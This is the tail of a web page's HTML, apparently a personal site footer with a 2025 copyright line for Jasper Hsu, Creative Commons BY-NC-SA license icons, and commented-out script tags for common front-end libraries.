                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
                    <title>Copyright</title>
                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
                    <use xlink:href=#ai:simple-icons:copyright></use>
                </svg>
                <div class="content left" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
                </div>
            </span>
        </div>
        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Creative Commons</title>
                    <symbol id=ai:fa6-brands:creative-commons>
                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Creative Commons</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Attribute</title>
                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
<!--
<script type="text/javascript" src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/bootstrap@5.2.1/dist/js/bootstrap.min.js"></script>
<div id="back-to-top" class=""><svg viewBox="0 0 24 24"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"></path></svg></div>
-->
</div>
</body>
</html>
